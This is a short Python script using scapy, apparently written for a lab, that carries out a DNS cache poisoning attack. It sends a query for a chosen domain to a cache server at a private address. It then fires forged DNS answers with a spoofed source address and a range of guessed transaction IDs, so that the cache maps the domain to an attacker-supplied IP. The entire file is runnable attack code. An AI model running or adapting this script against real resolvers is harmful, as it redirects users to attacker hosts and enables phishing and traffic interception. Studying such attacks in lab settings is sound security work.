from scapy.all import *
from time import time

if len(sys.argv) < 3:
    print("Usage: attack.py [target domain] [spoofed IP]")
    sys.exit()




hostname = sys.argv[1]
fake_ip = sys.argv[2]
cache_server_ip = "10.0.0.2"
PREDICTED_REQUEST_ID = 500

cache_server_port = 22222


print("Real ip")
os.system(f"nslookup {hostname} 1.1.1.1")
print("")


i = IP(dst=cache_server_ip, src="10.0.0.5")
u = UDP(dport=cache_server_port, sport=53)
d = DNS(id=0, qr=1, qd=DNSQR(qname=hostname), qdcount=1, ancount=1, nscount=0, arcount=0, an=(DNSRR(rrname=DNSQR(qname=hostname).qname, type='A', ttl=3600, rdata=fake_ip)))

# faked response to the dns cache server
response = i / u / d

local_request_id = 500 # only for the attacker-dns_cache connection
request = IP(dst=cache_server_ip) / UDP(dport=53) / DNS(id=local_request_id, qr=0, rd=1, qdcount=1, qd=DNSQR(qname=hostname, qtype="A", qclass="IN"))

#response[DNS].id = range(32768, 61000)
response[DNS].id = range(10000, 10500)

send(request, verbose=0)
#send(response, verbose=0)

start_time = time()

send(response, iface="eth0", verbose=0)

print("Sent attack in", round(time()-start_time, 4))

print("Cached value")
os.system(f"nslookup {hostname} {cache_server_ip}")
